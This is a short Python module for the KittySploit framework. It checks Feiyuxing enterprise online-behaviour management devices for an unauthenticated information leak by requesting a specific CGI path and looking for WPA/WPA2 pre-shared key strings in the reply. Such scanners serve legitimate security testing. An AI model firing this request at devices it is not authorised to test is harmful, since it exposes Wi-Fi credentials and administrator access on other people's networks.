#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Feiyuxing enterprise-level intelligent online behavior management system has authority bypass and information ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Feiyuxing Information - Exposure Detection',
        'description': 'Feiyuxing enterprise-level intelligent online behavior management system has authority bypass and information leakage vulnerabilities, which can obtain administrator rights and user passwords',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'misconfiguration', 'misconfig', 'exposure', 'iot', 'wpa', 'wpa2', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/%E9%A3%9E%E9%B1%BC%E6%98%9F/%E9%A3%9E%E9%B1%BC%E6%98%9F%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md',
            'https://github.com/hktalent/scan4all/blob/main/lib/goby/goby_pocs/Adslr_Enterprise_online_behavior_management_system_Information_leakage.json',
            'https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%A3%9E%E9%B1%BC%E6%98%9F%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/request_para.cgi?parameter=wifi_get_5g_host', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('WPA2-PSK', 'WPA-PSK',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Feiyuxing Information - Exposure detected",
                path='/request_para.cgi?parameter=wifi_get_5g_host',
            )
            return True
        return False

